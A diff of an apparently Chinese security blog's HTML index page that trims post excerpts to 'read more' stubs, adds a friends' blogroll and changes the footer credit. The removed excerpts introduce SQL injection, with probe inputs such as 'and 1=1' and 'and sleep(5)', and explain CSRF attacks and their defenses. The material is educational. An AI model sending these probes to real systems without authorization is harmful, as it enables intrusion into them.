-          <h2 id="SQL注入是什么"><a href="#SQL注入是什么" class="headerlink" title="SQL注入是什么"></a>SQL注入是什么</h2><h3 id="SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行。"><a href="#SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行。" class="headerlink" title="SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行。"></a>SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行。</h3><h2 id="SQL注入漏洞产生原理"><a href="#SQL注入漏洞产生原理" class="headerlink" title="SQL注入漏洞产生原理"></a>SQL注入漏洞产生原理</h2><h3 id="对构造成SQL语句的变量，过滤不严格，造成可以构造任意的SQL语句，传递到数据库执行。"><a href="#对构造成SQL语句的变量，过滤不严格，造成可以构造任意的SQL语句，传递到数据库执行。" class="headerlink" title="对构造成SQL语句的变量，过滤不严格，造成可以构造任意的SQL语句，传递到数据库执行。"></a>对构造成SQL语句的变量，过滤不严格，造成可以构造任意的SQL语句，传递到数据库执行。</h3><h2 id="哪里能够引发SQL注入"><a href="#哪里能够引发SQL注入" class="headerlink" title="哪里能够引发SQL注入"></a>哪里能够引发SQL注入</h2><pre><code>* get query string
-* port string
-* http header
-</code></pre><h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><pre><code>* UNION query SQL injection（可联合查询注入）
-* Boolean-based blind SQL injection（布尔型注入）
-* Error-based SQL injection（报错型注入）
-* Stacked queries SQL injection（可多语句查询注入）
-* Time-based blind SQL injection（基于时间延迟注入）
-</code></pre><h2 id="如何判断SQL注入"><a href="#如何判断SQL注入" class="headerlink" title="如何判断SQL注入"></a>如何判断SQL注入</h2><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;</span><br><span class="line">\</span><br><span class="line">and 1=1  / and 1=2</span><br><span class="line">+1 / -1</span><br><span class="line">and sleep(5)</span><br><span class="line">………</span><br></pre></td></tr></table></figure>
-</code></pre><h2 id="SQL注入利用手法"><a href="#SQL注入利用手法" class="headerlink" title="SQL注入利用手法"></a>SQL注入利用手法</h2><h3 id="UNION-query-SQL-injection（可联合查询注入）"><a href="#UNION-query-SQL-injection（可联合查询注入）" class="headerlink" title="UNION query SQL injection（可联合查询注入）"></a>UNION query SQL injection（可联合查询注入）</h3><h4 id="优点：方便-易于利用-快捷"><a href="#优点：方便-易于利用-快捷" class="headerlink" title="优点：方便 易于利用 快捷"></a>优点：方便 易于利用 快捷</h4>
+          <h2 id="SQL注入是什么"><a href="#SQL注入是什么" class="headerlink" title="SQL注入是什么"></a>SQL注入是什么</h2><h3 id="SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行。"><a href="#SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行。" class="headerlink" title="SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行。"></a>SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传递给后台的SQL服务器加以解析并执行。</h3>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/06/14/13/#more" rel="contents">
               阅读全文 &raquo;
@@ -1060,7 +952,7 @@ echo  &quot;File g uploading  failed.\n&quot;;
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">发表于</span>
+            <span class="post-meta-item-text">更新于</span>
             <time itemprop="dateCreated" datetime="2016-06-14T15:33:36+08:00" content="2016-06-14">
               2016-06-14
             </time>
@@ -1153,7 +1045,7 @@ echo  &quot;File g uploading  failed.\n&quot;;
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">发表于</span>
+            <span class="post-meta-item-text">更新于</span>
             <time itemprop="dateCreated" datetime="2016-06-14T15:32:50+08:00" content="2016-06-14">
               2016-06-14
             </time>
@@ -1183,24 +1075,12 @@ echo  &quot;File g uploading  failed.\n&quot;;
 
       
         
-          
-            <h2 id="0x00-CSRF背景介绍："><a href="#0x00-CSRF背景介绍：" class="headerlink" title="0x00 CSRF背景介绍："></a>0x00 CSRF背景介绍：</h2><h3 id="跨站请求伪造（Cross-Site-Request-Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。"><a href="#跨站请求伪造（Cross-Site-Request-Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。" class="headerlink" title="跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。"></a>跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。</h3><h2 id="0x01-成因："><a href="#0x01-成因：" class="headerlink" title="0x01 成因："></a>0x01 成因：</h2><h3 id="服务器错把“经过认证的浏览器发起的请求”当成“经过认证的用户发起的请求”，当已认证的用户点击攻击者构造的恶意链接后就“被”执行了相应的操作。由于目标站无token-referer限制，导致攻击者可以用户的身份完成操作达到各种目的。根据HTTP请求方式，CSRF利用方式可分为GET、POST和Flash、CSRF蠕虫等。"><a href="#服务器错把“经过认证的浏览器发起的请求”当成“经过认证的用户发起的请求”，当已认证的用户点击攻击者构造的恶意链接后就“被”执行了相应的操作。由于目标站无token-referer限制，导致攻击者可以用户的身份完成操作达到各种目的。根据HTTP请求方式，CSRF利用方式可分为GET、POST和Flash、CSRF蠕虫等。" class="headerlink" title="服务器错把“经过认证的浏览器发起的请求”当成“经过认证的用户发起的请求”，当已认证的用户点击攻击者构造的恶意链接后就“被”执行了相应的操作。由于目标站无token/referer限制，导致攻击者可以用户的身份完成操作达到各种目的。根据HTTP请求方式，CSRF利用方式可分为GET、POST和Flash、CSRF蠕虫等。"></a>服务器错把“经过认证的浏览器发起的请求”当成“经过认证的用户发起的请求”，当已认证的用户点击攻击者构造的恶意链接后就“被”执行了相应的操作。由于目标站无token/referer限制，导致攻击者可以用户的身份完成操作达到各种目的。根据HTTP请求方式，CSRF利用方式可分为GET、POST和Flash、CSRF蠕虫等。</h3><h2 id="0x02-利用："><a href="#0x02-利用：" class="headerlink" title="0x02 利用："></a>0x02 利用：</h2><h3 id="1、GET类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求就可以。"><a href="#1、GET类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求就可以。" class="headerlink" title="1、GET类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求就可以。"></a>1、GET类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求就可以。</h3><h3 id="2、POST类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的隐藏表单。"><a href="#2、POST类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的隐藏表单。" class="headerlink" title="2、POST类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的隐藏表单。"></a>2、POST类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的隐藏表单。</h3><h3 id="3、Flash-CSRF通常是由于Crossdomain-xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，如"><a href="#3、Flash-CSRF通常是由于Crossdomain-xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，如" class="headerlink" title="3、Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，如:"></a>3、Flash CSRF通常是由于Crossdomain.xml文件配置不当造成的，利用方法是使用swf来发起跨站请求伪造，如:</h3><h4 id="Flash跨域权限管理文件设置为允许所有主机域名跨域对本站进行读写数据"><a href="#Flash跨域权限管理文件设置为允许所有主机域名跨域对本站进行读写数据" class="headerlink" title="Flash跨域权限管理文件设置为允许所有主机域名跨域对本站进行读写数据"></a>Flash跨域权限管理文件设置为允许所有主机域名跨域对本站进行读写数据</h4><pre><code>    &lt;cross-domain-policy&gt;
-        &lt;allow-access-from domain=&quot;*&quot;/&gt;
-    &lt;/cross-domain-policy&gt;
-Flash跨域权限管理文件过滤规则不严导致可以从其它任何域传Flash产生CSRF。
-</code></pre><h3 id="4、CSRF常见的危害是攻击者可以在用户不知情的情况下以用户的身份进行指定的操作，但实际上CSRF的危害远不止于此，经过特意构造的CSRF可以产生蠕虫的效果。如某社区私信好友的接口和获取好友列表的接口都存在CSRF漏洞，攻击者就可以将其组合成一个CSRF蠕虫——当一个用户访问恶意页面后通过CSRF获取其好友列表信息，然后再利用私信好友的CSRF漏洞给其每个好友发送一条指向恶意页面的信息，只要有人查看这个信息里的链接，CSRF蠕虫就会不断传播下去，其可能造成的危害和影响非常巨大。"><a href="#4、CSRF常见的危害是攻击者可以在用户不知情的情况下以用户的身份进行指定的操作，但实际上CSRF的危害远不止于此，经过特意构造的CSRF可以产生蠕虫的效果。如某社区私信好友的接口和获取好友列表的接口都存在CSRF漏洞，攻击者就可以将其组合成一个CSRF蠕虫——当一个用户访问恶意页面后通过CSRF获取其好友列表信息，然后再利用私信好友的CSRF漏洞给其每个好友发送一条指向恶意页面的信息，只要有人查看这个信息里的链接，CSRF蠕虫就会不断传播下去，其可能造成的危害和影响非常巨大。" class="headerlink" title="4、CSRF常见的危害是攻击者可以在用户不知情的情况下以用户的身份进行指定的操作，但实际上CSRF的危害远不止于此，经过特意构造的CSRF可以产生蠕虫的效果。如某社区私信好友的接口和获取好友列表的接口都存在CSRF漏洞，攻击者就可以将其组合成一个CSRF蠕虫——当一个用户访问恶意页面后通过CSRF获取其好友列表信息，然后再利用私信好友的CSRF漏洞给其每个好友发送一条指向恶意页面的信息，只要有人查看这个信息里的链接，CSRF蠕虫就会不断传播下去，其可能造成的危害和影响非常巨大。"></a>4、CSRF常见的危害是攻击者可以在用户不知情的情况下以用户的身份进行指定的操作，但实际上CSRF的危害远不止于此，经过特意构造的CSRF可以产生蠕虫的效果。如某社区私信好友的接口和获取好友列表的接口都存在CSRF漏洞，攻击者就可以将其组合成一个CSRF蠕虫——当一个用户访问恶意页面后通过CSRF获取其好友列表信息，然后再利用私信好友的CSRF漏洞给其每个好友发送一条指向恶意页面的信息，只要有人查看这个信息里的链接，CSRF蠕虫就会不断传播下去，其可能造成的危害和影响非常巨大。</h3><h2 id="0x03-修复："><a href="#0x03-修复：" class="headerlink" title="0x03 修复："></a>0x03 修复：</h2><h3 id="关键操作用POST请求，"><a href="#关键操作用POST请求，" class="headerlink" title="关键操作用POST请求，"></a>关键操作用POST请求，</h3><h4 id="1、验证码"><a href="#1、验证码" class="headerlink" title="1、验证码"></a>1、验证码</h4><pre><code>- CSRF攻击的过程，往往是在用户不知情的情况下构造网络请求。所以如果使用验证码，那么每次操作都需要用户进行互动，从而简单有效的防御了CSRF攻击。
-- 但是如果你在一个网站作出任何举动都要输入验证码会严重影响用户体验，所以验证码一般只出现在特殊操作里面，或者在注册时候使用
-</code></pre><h4 id="2、检测refer"><a href="#2、检测refer" class="headerlink" title="2、检测refer"></a>2、检测refer</h4><pre><code>- 常见的互联网页面与页面之间是存在联系的，比如你在www.baidu.com应该是找不到通往www.google.com的链接的，再比如你在论坛留言，那么不管你留言后重定向到哪里去了，之前的那个网址一定会包含留言的输入框，这个之前的网址就会保留在新页面头文件的Referer中
-- 通过检查Referer的值，我们就可以判断这个请求是合法的还是非法的，但是问题出在服务器不是任何时候都能接受到Referer的值，所以Refere Check 一般用于监控CSRF攻击的发生，而不用来抵御攻击。
-</code></pre><h4 id="3、Token"><a href="#3、Token" class="headerlink" title="3、Token"></a>3、Token</h4><pre><code>- 目前主流的做法是使用Token抵御CSRF攻击。下面通过分析CSRF 攻击来理解为什么Token能够有效
-- CSRF攻击要成功的条件在于攻击者能够预测所有的参数从而构造出合法的请求。所以根据不可预测性原则，我们可以对参数进行加密从而防止CSRF攻击。
-- 另一个更通用的做法是保持原有参数不变，另外添加一个参数Token，其值是随机的。这样攻击者因为不知道Token而无法构造出合法的请求进行攻击。
-- Token 使用原则
-  Token要足够随机————只有这样才算不可预测
-  Token是一次性的，即每次请求成功后要更新Token————这样可以增加攻击难度，增加预测难度
-  Token要注意保密性————敏感操作使用post，防止Token出现在URL中
-</code></pre>
-          
+          <h2 id="0x00-CSRF背景介绍："><a href="#0x00-CSRF背景介绍：" class="headerlink" title="0x00 CSRF背景介绍："></a>0x00 CSRF背景介绍：</h2><h3 id="跨站请求伪造（Cross-Site-Request-Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。"><a href="#跨站请求伪造（Cross-Site-Request-Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。" class="headerlink" title="跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。"></a>跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种使已登录用户在不知情的情况下执行某种动作的攻击。因为攻击者看不到伪造请求的响应结果，所以CSRF攻击主要用来执行动作，而非窃取用户数据。当受害者是一个普通用户时，CSRF可以实现在其不知情的情况下转移用户资金、发送邮件等操作；但是如果受害者是一个具有管理员权限的用户时CSRF则可能威胁到整个Web系统的安全。</h3>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/06/14/11/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -1261,7 +1141,7 @@ Flash跨域权限管理文件过滤规则不严导致可以从其它任何域传
             <span class="post-meta-item-icon">
               <i class="fa fa-calendar-o"></i>
             </span>
-            <span class="post-meta-item-text">发表于</span>
+            <span class="post-meta-item-text">更新于</span>
             <time itemprop="dateCreated" datetime="2016-05-06T10:42:07+08:00" content="2016-05-06">
               2016-05-06
             </time>
@@ -1291,8 +1171,7 @@ Flash跨域权限管理文件过滤规则不严导致可以从其它任何域传
 
       
         
-          <h2 id="渗透测试基础知识"><a href="#渗透测试基础知识" class="headerlink" title="渗透测试基础知识"></a>渗透测试基础知识</h2><h4 id="这些知识真的很大，首先作为一个新手的我现在也同样处在迷茫期，要学的知识多、杂。有时都不知道从什么地方入手，还好我们生在一个好年代，Internet发展如此快，只有你想不到，没有找不到的，具体怎么运用就看自己的了，写个总结，慢慢看着，主要是能提醒我自己。。。"><a href="#这些知识真的很大，首先作为一个新手的我现在也同样处在迷茫期，要学的知识多、杂。有时都不知道从什么地方入手，还好我们生在一个好年代，Internet发展如此快，只有你想不到，没有找不到的，具体怎么运用就看自己的了，写个总结，慢慢看着，主要是能提醒我自己。。。" class="headerlink" title="这些知识真的很大，首先作为一个新手的我现在也同样处在迷茫期，要学的知识多、杂。有时都不知道从什么地方入手，还好我们生在一个好年代，Internet发展如此快，只有你想不到，没有找不到的，具体怎么运用就看自己的了，写个总结，慢慢看着，主要是能提醒我自己。。。"></a>这些知识真的很大，首先作为一个新手的我现在也同样处在迷茫期，要学的知识多、杂。有时都不知道从什么地方入手，还好我们生在一个好年代，Internet发展如此快，只有你想不到，没有找不到的，具体怎么运用就看自己的了，写个总结，慢慢看着，主要是能提醒我自己。。。</h4><p>网络、编程、系统。。。好多、好多、</p>
-<p>一、HTTP协议、操作系统<br>系统：Windows/Linux<br>服务：HTTP服务、FTP服务、SSH服务等<br>文件系统、权限、防火墙等<br>端口、IDS、IPS<br>二、Web前端<br>HTML/CSS、XML、JavaScript、Ajax、Jquery<br>PHP、ASP、.NET、JSP 等<br>三、数据库<br>MySql、SqlServer、Oracle、DB2、Nosql<br>四、常见漏洞<br>IIS、Apache、Nginx<br>五、注入<br>主站相对来说比较安全，没有突破口，可以利用和主站在一个服务器上面的网站进行突破。<br>六、探测<br>在线工具网站（ip查询、端口扫描、CDN查询、二级域名、旁站查询、ICP备案、whois、web识别、社工库查询、Email、用户搜索、图片查询、短信验证等）涉及：端口信息、服务信息等<br>七、漏洞扫描<br>工具：Burp、AWVS、AppScan、Nessus、W3af、Shipfish<br>八、测试工具<br>Sqlmap、Havij、Pangolin、Waf3、Burp、nmap<br>九、逻辑漏洞<br>比如：任意用户密码重置、刷积分、信息泄露等<br>程序的逻辑和人类的逻辑不一致导致漏洞产生<br>
+          <h2 id="渗透测试基础知识"><a href="#渗透测试基础知识" class="headerlink" title="渗透测试基础知识"></a>渗透测试基础知识</h2><h4 id="这些知识真的很大，首先作为一个新手的我现在也同样处在迷茫期，要学的知识多、杂。有时都不知道从什么地方入手，还好我们生在一个好年代，Internet发展如此快，只有你想不到，没有找不到的，具体怎么运用就看自己的了，写个总结，慢慢看着，主要是能提醒我自己。。。"><a href="#这些知识真的很大，首先作为一个新手的我现在也同样处在迷茫期，要学的知识多、杂。有时都不知道从什么地方入手，还好我们生在一个好年代，Internet发展如此快，只有你想不到，没有找不到的，具体怎么运用就看自己的了，写个总结，慢慢看着，主要是能提醒我自己。。。" class="headerlink" title="这些知识真的很大，首先作为一个新手的我现在也同样处在迷茫期，要学的知识多、杂。有时都不知道从什么地方入手，还好我们生在一个好年代，Internet发展如此快，只有你想不到，没有找不到的，具体怎么运用就看自己的了，写个总结，慢慢看着，主要是能提醒我自己。。。"></a>这些知识真的很大，首先作为一个新手的我现在也同样处在迷茫期，要学的知识多、杂。有时都不知道从什么地方入手，还好我们生在一个好年代，Internet发展如此快，只有你想不到，没有找不到的，具体怎么运用就看自己的了，写个总结，慢慢看着，主要是能提醒我自己。。。</h4>
           <div class="post-more-link text-center">
             <a class="btn" href="/2016/05/06/10/#more" rel="contents">
               阅读全文 &raquo;
@@ -1436,6 +1315,40 @@ Flash跨域权限管理文件过滤规则不严导致可以从其它任何域传
 
         
         
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://leelie.github.io" title="伟哥's Blog" target="_blank">伟哥's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wkh.dropsec.xyz/" title="加油、未来's Blog" target="_blank">加油、未来's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://scorpoin.github.io" title="棟棟's Blog" target="_blank">棟棟's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.sina.com.cn/u/5619564526" title="磊磊's Blog" target="_blank">磊磊's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://liulangdelmao.github.io/" title="小卓's Blog" target="_blank">小卓's Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://nouername.github.io" title="飞妹妹's Blog" target="_blank">飞妹妹's Blog</a>
+                </li>
+              
+            </ul>
+          </div>
+        
 
       </section>
 
@@ -1462,13 +1375,13 @@ Flash跨域权限管理文件过滤规则不严导致可以从其它任何域传
 </div>
 
 <div class="powered-by">
-  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+  由 <a class="theme-link" href="https://lovexiaofeng.cn">小峰</a> 强力推荐
 </div>
 
 <div class="theme-info">
-  主题 -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Pisces
+  博主 -
+  <a class="theme-link" href="https://lovexiaofeng.cn">
+    小峰
   </a>
 </div>
 
